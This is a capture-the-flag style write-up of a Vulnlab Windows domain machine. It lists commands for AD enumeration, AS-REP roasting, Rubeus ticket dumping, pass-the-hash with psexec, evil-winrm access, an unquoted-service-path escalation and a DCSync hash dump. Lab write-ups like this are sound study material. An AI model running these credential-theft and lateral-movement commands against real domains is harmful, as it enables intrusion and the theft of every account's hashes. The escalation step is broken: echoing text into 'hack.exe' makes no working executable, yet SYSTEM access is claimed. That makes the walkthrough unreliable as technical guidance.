---
title: "Vulnlab Machine - Windows Domain Environment"
date: "2024-02-10"
slug: "vulnlab-writeup"
category: "Vulnlab"
tags: ["Vulnlab", "Windows", "Active Directory", "Kerberos"]
summary: "A walkthrough of a Windows domain environment machine focusing on Active Directory enumeration and Kerberos attacks."
---

# Vulnlab Machine - Windows Domain Environment

This writeup covers a Windows domain environment machine, focusing on Active Directory enumeration and exploitation.

## Initial Enumeration

### Port Scan

Initial port scan revealed typical Windows services:

```bash
nmap -sC -sV 10.10.10.xxx
```

Ports discovered:
- 88 (Kerberos)
- 135 (RPC)
- 389 (LDAP)
- 445 (SMB)
- 5985 (WinRM)

### SMB Enumeration

SMB enumeration revealed domain information:

```bash
smbclient -L //10.10.10.xxx -N
enum4linux -a 10.10.10.xxx
```

## Active Directory Enumeration

### LDAP Queries

Using LDAP queries to enumerate users:

```bash
ldapsearch -x -H ldap://10.10.10.xxx -b "dc=domain,dc=local"
```

### BloodHound

Using SharpHound to collect data for BloodHound:

```powershell
.\SharpHound.exe -c All
```

BloodHound revealed attack paths from low-privilege users to domain admin.

## Kerberos Attacks

### AS-REP Roasting

Identified users with Kerberos pre-authentication disabled:

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

### Credential Extraction

Using Rubeus to extract Kerberos tickets:

```powershell
.\Rubeus.exe dump /luid:0x12345
```

## Lateral Movement

### Pass the Hash

With extracted credentials, moved laterally:

```bash
psexec.py -hashes :NTLM_HASH domain/user@target_host
```

### WinRM Access

Gained access via WinRM:

```bash
evil-winrm -i target_host -u user -p password
```

## Privilege Escalation

### Unquoted Service Path

Found a service with an unquoted service path vulnerability:

```powershell
Get-WmiObject win32_service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

### Exploitation

Created a malicious executable in the writable directory:

```powershell
echo 'net user hacker Password123! /add' > C:\Program Files\Vulnerable Service\hack.exe
```

After service restart, gained SYSTEM privileges.

## Domain Compromise

### DCSync Attack

With domain admin privileges, performed DCSync to extract all domain hashes:

```bash
secretsdump.py domain.local/domain_admin@dc.domain.local
```

## Conclusion

This machine demonstrated the importance of understanding Active Directory attack paths and common misconfigurations in Windows environments.

